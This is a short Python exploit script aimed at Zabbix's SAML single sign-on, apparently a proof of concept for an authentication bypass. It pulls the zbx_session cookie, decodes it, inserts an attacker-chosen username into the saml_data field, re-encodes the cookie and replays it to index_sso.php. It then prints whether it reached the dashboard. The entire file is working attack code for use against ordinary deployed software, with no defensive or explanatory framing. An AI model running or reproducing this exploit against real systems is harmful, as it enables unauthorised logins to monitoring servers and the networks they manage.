#!/usr/bin/env python3
from flask import session
import requests
import re
import urllib.parse
import base64
import json
import sys


def exploit(url, username):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Connection": "close",
               "Accept": "*/*"}
    resp = requests.get(url=url, headers=headers, verify=False)
    try:
        zbx_session = resp.cookies['zbx_session']
        url_decode_data = urllib.parse.unquote(
            zbx_session, encoding='utf-8')
        base64_decode_data = base64.b64decode(url_decode_data)
        decode_to_str = str(base64_decode_data, encoding='utf-8')
        to_json = json.loads(decode_to_str)
        tmp_ojb = dict(saml_data=dict(username_attribute=username),
                       sessionid=to_json["sessionid"], sign=to_json["sign"])
        payloadJson = json.dumps(tmp_ojb)
        print("decode_payload:", payloadJson)
        payload = urllib.parse.quote(base64.b64encode(payloadJson.encode()))
        print("zbx_signed_session:", payload)
    except:
        print("Unable to get Cookie for "+resp.url+"\n")
        return True
    if zbx_session:
        cookies2 = {"zbx_session": payload}
        response = requests.get(""+resp.url+"index_sso.php",
                                headers=headers, cookies=cookies2, verify=False)
        if "action=dashboard" in response.text:
            login = ("Login Worked - Target: " +
                     resp.url+" Username: "+username+"")
            print(login)
        else:
            print("Login Failed - Target: " +
                  resp.url+" Username: "+username+"\n")
    username = None


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("argv error")
        exit(0)
    url = sys.argv[1]
    username = sys.argv[2]
    exploit(url, username)
